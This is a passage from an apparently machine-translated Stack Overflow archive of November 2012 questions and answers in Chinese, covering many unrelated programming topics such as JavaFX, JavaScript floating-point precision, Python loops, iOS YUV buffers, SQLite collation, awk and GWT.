.menu {height: 30px;width: 759px;background: #3B5998;border:1px solid #e1e1e1; border-top-left-radius:5px;-moz-border-radius-topleft:5px; border-top-right-radius:5px;-moz-border-radius-topright:5px}
.menu li {position: relative;list-style: none;float: left;display: block;height: 30px;}
.menu ul { display: none;}
.menu li a{display: block;padding: 0 14px;line-height: 30px;text-decoration: none;font-family: Tahoma;font-weight: bold;font-size: 11px;color: #f9f9f9;border-left:1px solid #8698C0;}
.menu li:hover > a{ color: #9a9a9a; background:#fff; border-left:1px solid #ccc;}
.menu li a.first{border-left:0px; background:#ffvv00;}
.menu li.current a{border:0px; height:31px;color: #9a9a9a; background:#fff; margin-top:-3px; padding-top:3px; padding-bottom:4px;border-top-left-radius:5px;-moz-border-radius-topleft:5px; border-top-right-radius:5px;-moz-border-radius-topright:5px;} 
.menu li:first-child a:hover{border-top-left-radius:5px;-moz-border-radius-topleft:5px; border-right:1px #ccc solid; margin-right:-1px;}
.menu li:last-child a{border-right: none; } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:13:48.083

对代码做了很多改动，最好看demo

[新演示](http://jsbin.com/ofewug/7/edit)

***注意：*** *我不确定，为什么你让你的活动元素比其他元素更高，并且它们有一些圆形边缘。看起来很奇怪*

# popup - JavaFX 2：可拖动的弹出工具窗口？

> ID：13429437
> 
> 赞同：2
> 
> 时间：2012-11-17T09:47:16.683
> 
> 标签：popup, draggable, javafx-2, stage

我想做一个可拖动的弹出控件，它独立于其父Window，并且没有系统的标题栏。

我尝试为可拖动面板重写 JavaFx 示例，以便根据节点上的鼠标事件移动未装饰的舞台，请参见下面的代码。不幸的是，这似乎无法正常工作，它不流畅，并且在多个屏幕上不规律地在屏幕上跳跃。我读到其他一些人使用了类似的方法，但是这是目前唯一的方法还是有人找到了一个不错的解决方案？谢谢，

```
private Node makeDraggable(final Node node) {
    final DragContext dragContext = new DragContext();
    final Node wrapGroup = node;

    wrapGroup.addEventFilter(
            MouseEvent.MOUSE_PRESSED,
            new EventHandler<MouseEvent>() {
                public void handle(final MouseEvent mouseEvent) {

                        dragContext.mouseAnchorX = mouseEvent.getX();
                        dragContext.mouseAnchorY = mouseEvent.getY();
                        dragContext.initialTranslateX =
                                stage.getX();
                        dragContext.initialTranslateY =
                                stage.getY();
                    }

            });

    wrapGroup.addEventFilter(
            MouseEvent.MOUSE_DRAGGED,
            new EventHandler<MouseEvent>() {
                public void handle(final MouseEvent mouseEvent) {

                        stage.setX(
                                dragContext.initialTranslateX
                                        + mouseEvent.getX()
                                        - dragContext.mouseAnchorX);
                        stage.setY(
                                dragContext.initialTranslateY
                                        + mouseEvent.getY()
                                        - dragContext.mouseAnchorY);
                    dragContext.initialTranslateX =
                            stage.getX();
                    dragContext.initialTranslateY =
                            stage.getY();

                }
            });

    return node;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T10:49:16.560

[我在制作时钟](https://gist.github.com/3388637)时使用了下面的示例方法。

我只在一个屏幕上测试过，因为我没有多个屏幕可用。

```
/** holder structure for drag delta amounts */
private static class Delta { double x, y; }

/** makes a stage draggable using a given node */
public static void makeDraggable(final Stage stage, final Node byNode) {
    final Delta dragDelta = new Delta();
    byNode.setOnMousePressed(new EventHandler<MouseEvent>() {
        @Override public void handle(MouseEvent mouseEvent) {
            // record a delta distance for the drag and drop operation.
            dragDelta.x = stage.getX() - mouseEvent.getScreenX();
            dragDelta.y = stage.getY() - mouseEvent.getScreenY();
            byNode.setCursor(Cursor.MOVE);
        }
    });
    byNode.setOnMouseReleased(new EventHandler<MouseEvent>() {
        @Override public void handle(MouseEvent mouseEvent) {
            byNode.setCursor(Cursor.HAND);
        }
    });
    byNode.setOnMouseDragged(new EventHandler<MouseEvent>() {
        @Override public void handle(MouseEvent mouseEvent) {
            stage.setX(mouseEvent.getScreenX() + dragDelta.x);
            stage.setY(mouseEvent.getScreenY() + dragDelta.y);
        }
    });
    byNode.setOnMouseEntered(new EventHandler<MouseEvent>() {
        @Override public void handle(MouseEvent mouseEvent) {
            if (!mouseEvent.isPrimaryButtonDown()) {
                byNode.setCursor(Cursor.HAND);
            }
        }
    });
    byNode.setOnMouseExited(new EventHandler<MouseEvent>() {
        @Override public void handle(MouseEvent mouseEvent) {
            if (!mouseEvent.isPrimaryButtonDown()) {
                byNode.setCursor(Cursor.DEFAULT);
            }
        }
    });
} 
```

# facebook - FB.api() 对象类型作为变量

> ID：13429445
> 
> 赞同：0
> 
> 时间：2012-11-17T09:48:12.437
> 
> 标签：facebook, api, object, types, facebook-opengraph

我写了下面的代码：

function processLWO(lwo,type) { FB.api('me/'+lwo, 'post', {shoe :'<%=sItemURL%>',object :'<%=sItemURL%>'}, function (response ） { //代码 } ）; }

我的问题在于以下代码行：

```
//Code that works - Code A
shoe :'<%=sItemURL%>',object :'<%=sItemURL%>'

//Code I want to use - Code B
type.toString():'<%=sItemURL%>' 
```

代码 A 有效，但我想实现代码 B，因为它更灵活，但是代码 B 返回一个 Javascript 错误，说明导致该函数的原始函数未定义。我知道 type.toString() 应该是 Facebook 对象（例如，鞋或对象），但如果 type.toString() 被处理并返回一个值，那么它将被评估为有效的对象类型。

任何建议如何解决这个问题？代码 A 就是这么懒惰/愚蠢....

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T21:06:19.593

```
var params = {};
params[type] = <%=sItemURL%>'
FB.api('/me/' + lwo, 'POST', params, ... 
```

# c# - 通过单击将树视图的项目添加到 WPF 中的文本框

> ID：13429447
> 
> 赞同：2
> 
> 时间：2012-11-17T09:48:47.727
> 
> 标签：c#, wpf

我有一个树视图，我想通过在 WPF 中单击它们将树视图项添加到文本框。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T20:38:08.310

只需将 MouseLeftButtonDown 事件处理程序添加到每个 TreeViewItem 并使用 sender 参数来提取 TreeViewItem 的内容。您甚至可以使用 Style 来确保附加事件处理程序。

```
<TreeView>
<TreeView.Resources>
<Style TargetType="TreeViewItem">
<EventSetter Event="MouseLeftButtonDown" Handler="TreeViewItem_MouseRightButtonDown">
</EventSetter>
</Style>
</TreeView.Resources>
<TreeViewItem Header="Root">
<TreeViewItem Header="Child 1">
<TreeViewItem Header="Grandchild 1"/>
<TreeViewItem Header="Grandchild 2"/>
</TreeViewItem>
<TreeViewItem Header="Child 2">
<TreeViewItem Header="Grandchild 3"/>
<TreeViewItem Header="Grandchild 4"/>
</TreeViewItem>
</TreeViewItem>
</TreeView> 
```

# javascript - 为什么 9999999999999999 在 JavaScript 中被转换为 10000000000000000？

> ID：13429451
> 
> 赞同：33
> 
> 时间：2012-11-17T09:49:43.080
> 
> 标签：javascript

谁能向我解释为什么 9999999999999999 转换为 10000000000000000？

```
alert(9999999999999999); //10000000000000000 
```

[http://jsfiddle.net/Y2Vb2/](http://jsfiddle.net/Y2Vb2/)

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2012-11-17T09:52:02.073

Javascript 没有整数，只有 64 位浮点数 - 而且您已经用完了浮点精度。

在 Java 中查看类似问题：[为什么 Double.parseDouble 将 9999999999999999 变为 10000000000000000？](https://stackoverflow.com/questions/8907666/why-is-the-double-parsedouble-making-9999999999999999-to-10000000000000000?rq=1)

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2012-11-17T09:55:33.277

1.  JavaScript 只有浮点数，没有整数。

2.  阅读[*每位计算机科学家应了解的关于浮点运算的知识*](http://docs.oracle.com/cd/E19957-01/806-3568/ncg_goldberg.html)。

    摘要：浮点数只包括有限的精度，超过 15 位（左右），你会得到四舍五入。

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2012-11-17T10:00:32.050

`9999999999999999`在 JavaScript 内部被视为浮点数。它不能在 IEEE 754 双精度中准确表示，因为它需要 54 位精度（位数为 log2(9999999999999999) = 53,150849512...并且由于不存在小数位，因此必须将结果向上取整）而 IEEE 754 仅提供 53 位（1 个隐含位 + 52 个显式存储的尾数位） - 少了一位。因此，数字只是四舍五入。

由于在这种情况下只丢失了一位，因此即使是 54 位数字也可以精确表示，因为它们仍然包含`0`在丢失的位中。考虑到 IEEE 754 的默认无偏舍入模式，奇数 54 位数字被舍入到恰好是 53 位偶数的两倍的最接近的值。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2018-05-07T11:45:41.127

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-11-17T10:29:55.227

问题：有时 JavaScript 计算似乎产生“不准确”的结果，例如 0.362*100 产生 36.199999999999996。我怎样才能避免这种情况？

答：JavaScript 在内部以双精度浮点格式存储所有数字，尾数为 52 位，指数为 11 位（用于存储数值的 IEEE 754 标准）。这种数字的内部表示可能会导致上述意外结果。大多数大于 253 = 9007199254740992 的整数不能以这种格式精确表示。同样，许多小数/分数（例如 0.362）无法准确表示，导致上述示例中的感知“不准确”。为了避免这些“不准确”的结果，您可能希望将结果四舍五入到您使用的数据的精度。

[http://www.javascripter.net/faq/accuracy.htm](http://www.javascripter.net/faq/accuracy.htm)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-11-12T14:32:02.670

**二进制形式的9999999999999999**是**100011100001101111001001101111110000001111111111111111** ，它有 54 位数字。

> 下面我们将把这个数字转换为 Javascript IEEE-754，它有 1 位符号，11 位二进制偏移格式的尾数和 52 位数字本身的符号。

在二进制形式中，第一个数字始终为**1**，因此 Javascript 在保存为 IEEE-754 格式时会省略尾数中数字的第一个数字。因此，我们将有**00011100001101111001001101111110000001111111111111111**作为尾数，这是 53 位数字，至于数字我们只能保留 52 位数字，我们将数字四舍五入删除最后一位数字**000111000011011110010010000000000000000000000000000000000000**

二进制形式的最终数字将为 1 **0001110000110111100100110111111000001000000000000000** 0，十进制形式为 10000000000000000

> 1 是第一个未写入尾数 52 位的数字，然后是 52 位尾数和一个 0，使其返回 54 位，即 十进制的**10000000000000000**

[除非您阅读这篇漂亮的文章](https://indepth.dev/posts/1139/here-is-what-you-need-to-know-about-javascripts-number-type#why-0-1-0-2-is-not-0-3)，否则这可能很难理解

# python - 需要帮助创建函数并在函数中调用函数

> ID：13429455
> 
> 赞同：0
> 
> 时间：2012-11-17T09:50:39.083
> 
> 标签：python, function

我是编程/Python 新手。我正在尝试创建一个将单词添加到列表中的函数。我尝试使用 while 循环来添加询问用户是否要添加另一个单词。如果用户输入“y”或“Y”，我想再次运行该函数。如果用户输入其他任何内容，我希望该函数返回列表。当我运行该函数时，无论输入什么，它都会继续再次运行该函数。请帮忙。谢谢

```
def add_list():
    x = []
    first_list = raw_input('Please input a word to add to a list ')
    x.append(first_list)
    response = raw_input('Would you like to enter another word ')
    while response == 'y' or 'Y':
        add_list()
    else:
        return x 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-17T09:51:21.857

```
while response == 'y' or 'Y': 
```

应该

```
while response == 'y' or response == 'Y': 
```

或者更好：

```
while response in ('y', 'Y'): 
```

* * *

这就是为什么您所做的不起作用的原因。下面的每一行都是等价的。

```
while response == 'y' or 'Y'
while (response == 'y') or ('Y')
while (response == 'y') or True
while True 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T09:53:39.587

只需将列表作为传递给函数的参数即可：

```
x = []
add_list(x) 
```

使用 add_list(x)

```
def add_list(x):
  first_list = raw_input('Please input a word to add to a list ')
  x.append(first_list)
  response = raw_input('Would you like to enter another word ')
  while response in ('y', 'Y'):
    add_list(x)
  else:
    return 
```

# objective-c - 如何将 y-planar、u-planar 和 uv-planar 与 ios 中的 yuv bi plane 分开？

> ID：13429456
> 
> 赞同：3
> 
> 时间：2012-11-17T09:50:44.607
> 
> 标签：objective-c, video-streaming, avfoundation

在应用程序中，我使用了 AVCaptureVideo。我得到了 kCVPixelFormatType_420YpCbCr8BiPlanarFullRange 格式的视频。

现在我从 imagebuffer 得到 y-planar 和 uv-planar。

```
 CVPlanarPixelBufferInfo_YCbCrBiPlanar *planar = CVPixelBufferGetBaseAddress(imageBuffer);

    size_t y-offset = NSSwapBigLongToHost(planar->componentInfoY.offset);
    size_t uv-offset = NSSwapBigLongToHost(planar->componentInfoCbCr.offset); 
```

这里 yuv 是双平面格式（y+UV）。

什么是平面UV？这是 uuuu,yyyy 格式还是 uvuvuvuv 格式？如何分别获得 u-planar 和 y-planar？

任何人都可以帮助我吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-19T23:32:48.630

Y 平面表示亮度分量，UV 平面表示 Cb 和 Cr 色度分量。

在 kCVPixelFormatType_420YpCbCr8BiPlanarFullRange 格式的情况下，您会发现亮度平面为 8bpp，与您的视频尺寸相同，您的色度平面为 16bpp，但只有原始视频大小的四分之一。在这个平面上，每个像素将有一个 Cb 和一个 Cr 分量。

因此，如果您的输入视频为 352x288，您的 Y 平面将为 352x288 8bpp，而您的 CbCr 为 176x144 16bpp。这与 12bpp 352x288 图像的数据量大致相同，是 RGB888 所需数据量的一半，但仍低于 RGB565。

所以在缓冲区中，Y `[YYYYY . . . ]` 和 UV 看起来像这样`[UVUVUVUVUV . . .]`

与 RGB 相比，当然， `[RGBRGBRGB . . . ]`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-11-29T02:22:28.797

下面的代码从 pixelBuffer 复制*yuv*数据，其格式为 kCVPixelFormatType_420YpCbCr8BiPlanarFullRange。

```
CVPixelBufferLockBaseAddress(pixelBuffer, 0);

size_t pixelWidth = CVPixelBufferGetWidth(pixelBuffer);
size_t pixelHeight = CVPixelBufferGetHeight(pixelBuffer);
// y bite size
size_t y_size = pixelWidth * pixelHeight;
// uv bite size
size_t uv_size = y_size / 2;
uint8_t *yuv_frame = malloc(uv_size + y_size);
// get base address of y
uint8_t *y_frame = CVPixelBufferGetBaseAddressOfPlane(pixelBuffer, 0);
// copy y data
memcpy(yuv_frame, y_frame, y_size);
// get base address of uv
uint8_t *uv_frame = CVPixelBufferGetBaseAddressOfPlane(pixelBuffer, 1);
// copy uv data
memcpy(yuv_frame + y_size, uv_frame, uv_size);

CVPixelBufferUnlockBaseAddress(pixelBuffer, 0); 
```

# windows-phone-7 - 在 WP7 中禁用图像缓存

> ID：13429458
> 
> 赞同：2
> 
> 时间：2012-11-17T09:50:53.990
> 
> 标签：windows-phone-7, windows-phone-7.1

我在 WP7 平台的自动图像缓存中度过了一段可怕的时光。

我做了一个非常简单的应用程序（我的意思是非常简单）。他们**已经在解决方案中添加了 2 个图像**作为像素尺寸 1280 x 2000 的内容 这是 XAML

```
<Grid x:Name="LayoutRoot" Background="Transparent" ManipulationCompleted="ImageHolder_ManipulationCompleted">
    <Image x:Name="ImageHolder" />
    <TextBlock x:Name="MemoryUsage" />
</Grid> 
```

我的.cs

```
 ImageHolder.Source = null;
        if (i % 2 == 0)
            ImageHolder.Source = new BitmapImage(new Uri("image002.jpg", UriKind.Relative));
        else
            ImageHolder.Source = new BitmapImage(new Uri("image001.jpg", UriKind.Relative));
        i++;

   MemoryUsage.Text = "Device Total Memory = " + (long)DeviceExtendedProperties.GetValue("DeviceTotalMemory") / (1024 * 1024)
            + "\nCurrent Memory Usage = " + (long)DeviceExtendedProperties.GetValue("ApplicationCurrentMemoryUsage") / (1024 * 1024)
            + "\nPeak Memory Usage = " + (long)DeviceExtendedProperties.GetValue("ApplicationPeakMemoryUsage") / (1024 * 1024); 
```

内存使用量非常高，等于原始位图大小的 2 个图像，尽管应该只有一个这样的实例。请帮忙，我急需。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:13:43.267

首先将您的图像调整为正确的大小。如果屏幕不支持，那么高分辨率是没有意义的。还要确保图像的构建操作是“内容”，否则所有图像将在启动时加载到内存中。您可能仍然会看到高内存使用率，因为没有保证 GC 会立即处理图像，但迟早会处理。

# php - 以编程方式检查网站是否有移动版本。(Python/PHP)

> ID：13429465
> 
> 赞同：1
> 
> 时间：2012-11-17T09:51:58.283
> 
> 标签：php, python, mobile

假设我有一个传入的网站请求，其中包含桌面版网站的 url。我想检测这个网站是否有移动版本。

根据这个答案[获取网站移动版？](https://stackoverflow.com/questions/10629265/fetch-website-mobile-version)我要做的大部分是将用户代理设置为某些手机，服务器将为移动版本提供服务。

我想我也可以检查 m.domain.com 和 mobile.domain.com。

但这里有一个问题：
我怎么知道服务器是否响应移动版本？
还有其他获取手机版的方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T09:56:47.953

我不相信有一个适合所有问题的答案。您可以使用 curl 通过几个不同的用户代理访问域，并查看是否为移动设备和桌面设备返回了不同的内容，或者查看您是否被重定向到任何一个。

# java - 使用java（netbeans），windows在sqlite中进行数据排序

> ID：13429467
> 
> 赞同：2
> 
> 时间：2012-11-17T09:52:12.040
> 
> 标签：java, windows, sqlite, sorting, netbeans

我正在使用sqlite。除了排序，我没有任何问题。当我使用“order by”子句查询表时，我无法根据 iso8859-9 字符集获得正确的排序。我的编码的特殊字符显示在列表的末尾。它像是：

```
 - asdf
 - bnm
 - cgfj
 - dfgh
 - çdfg 
```

但我想要的是：

```
 - asdf
 - bnm
 - cgfj
 - çdfg
 - dfgh 
```

我能做些什么来克服这个问题？

提前致谢。

使用：

窗户，网豆，java，sqlite

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:32:21.353

你可以定义一个新的排序序列，如果你想解决从 sqlite 的排序，请参阅[定义新的排序序列。](http://www.sqlite.org/c3ref/create_collation.html)非常类似于[使用 System.Data.SQLite 对 UTF8 数据进行不区分大小写的排序](http://www.codeproject.com/Articles/44349/Case-Insensitive-Sort-of-UTF8-Data-Using-System-Da)。在您的情况下，您可能需要使用:`CultureInfo.CreateSpecificCulture("tr-TR");`而不是`CultureInfo.CreateSpecificCulture("ru-RU");`.

就像是：

```
using System.Data.SQLite;
using System.Globalization;

namespace SQLiteUTF8CIComparison {
    /// <summary />
    /// This function adds case-insensitive sort feature to SQLite engine 
    /// To initialize, use SQLiteFunction.RegisterFunction() 
    /// before all connections are open 
    /// </summary />
    [SQLiteFunction(FuncType = FunctionType.Collation, Name = "UTF8CI")]
    public class SQLiteCaseInsensitiveCollation : SQLiteFunction {
        /// <summary />
        /// CultureInfo for comparing strings in case insensitive manner 
        /// </summary />
        private static readonly CultureInfo _cultureInfo = 
            CultureInfo.CreateSpecificCulture("tr-TR");

        /// <summary />
        /// Does case-insensitive comparison using _cultureInfo 
        /// </summary />
        /// Left string
        /// Right string
        /// <returns />The result of a comparison</returns />
        public override int Compare(string x, string y) {
            return string.Compare(x, y, _cultureInfo, CompareOptions.IgnoreCase);
        }
    }
} 
```

如果您的要求允许，一个简单的替代方法是从 sqlite 检索未排序的数据并在 Java 中排序。请注意，仅当您不选择大量（数百万）条记录时才适合使用此方法，因为它会消耗大量内存。

# ms-project-server-2010 - 此 Project Server 2010 功能至少需要 Microsoft Internet Explorer 7.0

> ID：13429472
> 
> 赞同：0
> 
> 时间：2012-11-17T09:53:46.687
> 
> 标签：ms-project-server-2010, project-web-access

当我尝试访问我的 pwa 站点中的“管理时间表”和“项目中心”页面时遇到以下错误：“错误此 Project Server 2010 功能至少需要 Microsoft Internet Explorer 7.0。
解决 Microsoft SharePoint Foundation 的问题。相关 ID : 8f9f635b-c95b-4e2d-bd0a-e662c5d7b4ed"

我使用 Windows 8 (IE 10) 并且启用了兼容模式。

当我在我的系统中安装然后卸载“Avant Browser”时，首先出现此问题。

我已经阅读了一些解释这个问题是如何发生的以及如何解决它的文本。

我发现的一些建议解决方案是：

[http://support.microsoft.com/kb/2394699](http://support.microsoft.com/kb/2394699)

[http://epmsource.com/2012/06/05/windows-8-release-preview-and-project-server-2010/](http://epmsource.com/2012/06/05/windows-8-release-preview-and-project-server-2010/)

但不幸的是，他们都没有解决我的问题。

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2017-02-25T13:30:50.640

您已经将 URL 添加到 Compatability 视图，因此我建议将 URL 添加到本地 Intranet 站点以解决我的问题。

有关更多详细信息，请查看[Project Server 2010 至少需要 Microsoft Internet Explorer 7](https://blog.devoworx.net/2015/10/28/project-server-2010-requires-at-least-microsoft-internet-explorer-7/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T16:12:56.330

您是否按照链接的建议更改了用户代理？

我还发现，如果存在限制或缺少基本 Active X 控件，您可能还会收到“*此 Project Server 2010 功能需要的错误....* ”

不确定它们是什么，但发现在尝试使用 modern.ie 虚拟机时，它们无法与 Project Server 2010 一起使用。

# awk - 如何使用awk将小写字母替换为大写字母'C'？

> ID：13429477
> 
> 赞同：1
> 
> 时间：2012-11-17T09:54:22.677
> 
> 标签：awk

我有一个包含蛋白质序列的文本文件。我想将所有小写字母替换为大写字母“C”。我怎样才能用 awk 做到这一点？

```
>1CHE
aHKLbMaHc
>2HV3
PNMRrYnf
>5GH3
LKDeVmqQ

desired output

>1CHE
CHKLCMCHC
>2HV3
PNMRCYCC
>5GH3
LKDCVCCQ 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-17T10:01:13.737

```
echo 'changecase' | tr [:lower:] C 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T09:59:43.203

我会用`sed`这个：

```
sed '/^>/!s/[a-z]/C/g' file.txt 
```

如果你想要`awk`，这里是：

```
awk '!/^>/ { gsub(/[a-z]/, "C") }1' file.txt 
```

结果：

```
>1CHE
CHKLCMCHC
>2HV3
PNMRCYCC
>5GH3
LKDCVCCQ 
```

# solr - 索引 nutch 抓取的 solr 数据时出错

> ID：13429481
> 
> 赞同：8
> 
> 时间：2012-11-17T09:56:04.947
> 
> 标签：solr, indexing, runtime-error, nutch

我已经开始使用 nutch 和 solr，但在将 Solr 与 Nutch 集成时遇到了问题。我遵循了本教程：[http](http://wiki.apache.org/nutch/NutchTutorial) ://wiki.apache.org/nutch/NutchTutorial 并在使用后： `bin/nutch crawl urls -solr http://localhost:8983/solr/ -depth 3 -topN 5` nutch 显示消息：

> java.io.IOException：作业失败！

并且 solr 显示：

> 严重：org.apache.solr.common.SolrException：错误：[doc=http://nutch.apache.org/] 未知字段“主机”

我认为原因可能是 $SOLR_HOME/example/solr/conf/schema.xml 中缺少“主机”字段，但它就在那里。我将非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-04-06T20:53:43.020

在 Nutch 端更改配置不会影响 Solr 的架构。您必须在 Solr 的 schema.xml 中定义该字段。

# gwt - GWT ClientBundle：在 CssResource 文件中使用 DataResource

> ID：13429483
> 
> 赞同：1
> 
> 时间：2012-11-17T09:56:42.920
> 
> 标签：gwt

我正在尝试在 CSS 中使用使用 Client Bundle 加载的图像，所以我使用 CssResource 编码如下，对我不起作用

**ClientBundle 接口**

```
public interface MyResources extends ClientBundle {
      @Source("tab_off_LT.png")
      DataResource image();

      @Source("my.css")
      MyCssResources css();
    } 
```

**Css资源接口**

```
public interface MyCssResources extends CssResource{

    String myImage();
} 
```

CSS 文件

```
@url test1 image;
.myImage {
  background: 'test1';
  width: 50px;
} 
```

**实现代码**

```
RootLayoutPanel rp = RootLayoutPanel.get();
MyResources myr = (MyResources) GWT.create(MyResources.class);
myr.css().ensureInjected();
Label l = new Label("Test BackgroundImage");
l.setStyleName(myr.css().myImage());
rp.add(l); 
```

如果我在代码中的任何地方出错，请纠正我，想知道哪里出错了吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T10:26:55.507

`@url`定义一个变量（在您的情况下名为`test1`）。代码中的值`background`是字符串文字，而不是对变量的引用：删除引号。

```
@url test1 image;
.myImage {
   background: test1;
   width: 50px;
} 
```

请参阅[https://developers.google.com/web-toolkit/doc/latest/DevGuideClientBundle#References_to_Data_Resources](https://developers.google.com/web-toolkit/doc/latest/DevGuideClientBundle#References_to_Data_Resources)

# sublimetext2 - SublimeLinter 中的 cppcheck 不起作用

> ID：13429491
> 
> 赞同：4
> 
> 时间：2012-11-17T09:57:20.797
> 
> 标签：sublimetext2, cppcheck

我是 sublime text 的新手，但遇到了一个问题 - 我通过[Package Control安装了](http://wbond.net/sublime_packages/package_control)[SublimeLinter](https://github.com/SublimeLinter/SublimeLinter)，并通过（我使用的是 linux mint 13）安装了 cppcheck。SublimeLinter 与 python 源代码一起工作得很好，但是当我保存/加载 .cpp 文件并要求在 C++ 源代码中显示 lint 错误时不显示任何生命体征。我究竟做错了什么？`sudo apt-get install cppcheck`

UPD

这是我的崇高文本控制台输出：

```
...
SublimeLinter: c_cpplint loaded
SublimeLinter: C loaded
...
SublimeLinter: c enabled (using "cppcheck" for executable)
SublimeLinter: python enabled (built in)
... 
```

我应该手动设置对 .cpp 代码的支持吗？

# jquery - jquery,cfc 登录/忘记密码检查数据库中的现有记录

> ID：13429494
> 
> 赞同：1
> 
> 时间：2012-11-17T09:57:58.840
> 
> 标签：jquery, ajax, coldfusion, cfc

我一直在尝试制作类似于 download.cnet.com 上的登录/忘记密码弹出窗口。虽然我的代码实际上运行良好，但有一个问题。我无法让它在输入时工作。表单已提交，但 ajax 调用被跳过。

在这方面，我删除了提交按钮并使用 a`div`代替。然后点击：

```
$('#loginButton').click(function(){
  // ajax call check for existing record via cfc 
  // and returns true or false after which the appropriate 
  // actions are taken depending on returned value. 
  }
)}; 
```

一切正常，但我一直想知道 cnet 的人是如何让它在进入时工作的。如果你查看他们的网站，你会明白我在说什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-19T12:01:07.927

如果您提到 cnets 使用 cnet 登录和丢失密码功能，看起来他们正在弹出一个窗口，并使用 iframe 加载该表单的内容。

我想从理论上讲，如果您使用 iframe 加载颜色框，并在 iframe 中提交并在那里显示该信息，那么颜色框应该保持打开状态直到关闭。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-19T13:27:05.210

您说 onsubmit 弹出窗口关闭。这必须意味着您的功能实际上开始了。

我建议探索你的函数，看看为什么对你的 cfc 的调用被跳过，事实上它是。另外，一旦你弄清楚了，把提交按钮放回去。更改 html 表单的默认行为只会惹恼知道如何使用键盘的人。

另一件事。如果您使用的是 cfform，则可能必须将表单发送到 js 函数。换句话说，而不是这样：

```
<cfform onsubmit="yourFunction()"> 
```

做这个

```
<cfform onsubmit="yourFunction(this)"> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-19T16:32:47.337

单击“输入”提交表单，因此您还需要调用它 onSubmit。听起来您的功能正在运行（但您没有发布代码，所以这是任何人的猜测......对您感到羞耻）但页面提交不允许您看到正在发生的任何事情。如果您想阻止表单提交，您需要返回 false `onsubmit = "return yourFunction()"`。当您的函数返回 false 时，它​​将阻止表单提交。

请参阅[JavaScript 表单验证](http://www.w3schools.com/js/js_form_validation.asp)

# c++ - 使用来自 Qt 的 symbian 本机 API

> ID：13429497
> 
> 赞同：1
> 
> 时间：2012-11-17T09:58:42.473
> 
> 标签：c++, qt, qt-creator, symbian, s60

在 Qt Creator 中开发的 Qt 程序是否可以调用 symbian S60 本机 API。

我该怎么做？我需要下载额外的头文件/库，还是 Qt SDK 附带它们？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T10:36:02.587

是的，你可以做到。

但是，您需要确保您选择了“Symbian 目标”，而不是“模拟器”，即在为桌面模拟构建时不能调用 S60 API。

# asp.net-mvc - 模型绑定到复杂对象

> ID：13429505
> 
> 赞同：0
> 
> 时间：2012-11-17T10:00:25.467
> 
> 标签：asp.net-mvc, razor, drop-down-menu, model-binding, multiple-records

嗨，我正在尝试从单个表单同时插入多个记录，以下是我的模型和视图

**我的模特**

```
public class Invoice
{
    public int InvoiceID { get; set; }
    public string InvoiceNo { get; set; }
    public DateTime InvoiceDate { get; set; }
    public bool Posted { get; set; }

    public virtual List<InvoiceDetail> InvoiceDetails { get; set; }
}

public class InvoiceDetail
    {
        public int InvoiceDetailID { get; set; }

        public int InvoiceID { get; set; }
        public Invoice Invoice { get; set; }

        public int ItemID { get; set; }
        public virtual Item Item { get; set; }

        public double Price { get; set; }
        public double Quantity { get; set; }
    }

public class Item
    {
        public int ItemID { get; set; }
        public string Description { get; set; }        
    } 
```

**在视图中**

```
 @model IList<MultiInsert.Models.InvoiceDetail>
@{
    ViewBag.Title = "Create";
}
<h2>
    Create</h2>
<script src="@Url.Content("~/Scripts/jquery.validate.min.js")" type="text/javascript"></script>
<script src="@Url.Content("~/Scripts/jquery.validate.unobtrusive.min.js")" type="text/javascript"></script>
@using (Html.BeginForm())
{
    @Html.ValidationSummary(true)
    <fieldset>
        <legend>InvoiceDetail</legend>
        @for (int i = 0; i < 2; i++)
        {        
            <div class="editor-label">
                @Html.LabelFor(model => model[i].ItemID, "Item")
            </div>
            <div class="editor-field">
                @{string itemid = "[" + i + "].ItemID";
                    @Html.DropDownList("ItemID", String.Empty)
                    @Html.ValidationMessageFor(model => model[i].ItemID)
                }
            </div>

            <div class="editor-label">
                @Html.LabelFor(model => model[i].Price)
            </div>
            <div class="editor-field">
                @Html.EditorFor(model => model[i].Price)
                @Html.ValidationMessageFor(model => model[i].Price)
            </div>

            <div class="editor-label">
                @Html.LabelFor(model => model[i].Quantity)
            </div>
            <div class="editor-field">
                @Html.EditorFor(model => model[i].Quantity)
                @Html.ValidationMessageFor(model => model[i].Quantity)
            </div>
        }
        <p>
            <input type="submit" value="Create" />
        </p>
    </fieldset>
} 
```

问题是我的代码生成以下html，如下所示

```
<div class="editor-field">
<select id="ItemID" name="ItemID"><option value=""></option>
<option value="1">SALT</option>
<option value="2">RED CHILI</option>
</select><span class="field-validation-valid" data-valmsg-for="[0].ItemID" data-valmsg-replace="true"></span>            </div>
            <div class="editor-label">
                <label for="">Price</label>
            </div>
            <div class="editor-field">
                <input class="text-box single-line" data-val="true" data-val-number="The field Price must be a number." data-val-required="The Price field is required." name="[0].Price" type="text" value="" />
